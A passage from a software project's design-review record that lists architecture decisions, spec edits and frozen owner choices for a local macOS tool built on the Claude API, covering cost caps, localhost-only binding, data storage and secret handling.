| ADR-015 | Separate factor policy from aggregation policy | COST-01 |
| ADR-016 | Content hash vs volatile observations; material profile hash | COST-02, COST-03 |
| ADR-017 | Per-run LLM caps, deterministic pre-ranking, prompt caching | COST-04, COST-05 |
| ADR-018 | Missing-factor ranking policy, score bands and coverage gate | SCORE-01, SCORE-02 |
| ADR-019 | Run status model and terminal-status function | SPEC-02 |
| ADR-020 | Data directory, backups and export encryption | SEC-11 |
| ADR-021 | In-process worker for the MVP | UX-01 |
| ADR-022 | Dependency policy and install hardening | SEC-13 |

**Spec edits outside the ADRs:**

- §11 Phase 5: correct P5-01 and P5-02 (SPEC-01).
- §2.2: add the SPEC-03 tables; declare the table authoritative over the ERD (SPEC-04).
- §5.1 eligibility states (SPEC-05) and §5.4 aggregator validation (SPEC-06).
- §7.2: add the SPEC-07 endpoints.
- §10.2: require source, budget or "not disclosed", priority or "insufficient data", confidence and any non-eligible flag in the row; everything else may sit one interaction away (UX-03).
- Baseline §7.2 and §12: add references to ADR-015 through ADR-018; no confirmed value changes.

## Frozen decisions

These owner decisions, made on 20 Oct 2026, close the review's open points and go into the v1.1.0 specs.

| Topic | Decision |
| --- | --- |
| Remote access | Out of scope; server binds to `127.0.0.1` only and `FOI_BIND_HOST` is removed |
| LLM vendor | Anthropic Claude API for the first adapter; the adapter interface stays vendor-neutral |
| Hard monthly cap | $30: $20 LLM · $5 search · $5 reserve |
| Phase 3 gate without API approval | Closes on fixtures; the live-source test becomes a separate gate (changes baseline §13, row 3) |
| Repository | Local folder for now; later a private GitHub repository for trusted team members |
| Data location | Inside the project folder under `data/`; working database, backups and logs are ignored by Git (SEC-11) |
| Team sharing | `data/shared/` text export is committed, including scores and assessments where source terms permit; full copies move as encrypted snapshots outside Git |
| Platform | macOS only for the MVP; secrets in each person's Keychain |
| Web search | Brave Search API |
| Currency and language | USD amounts; English UI |

Before Phase 4, record Anthropic's current API data-retention and training terms in the provider register (SEC-07).
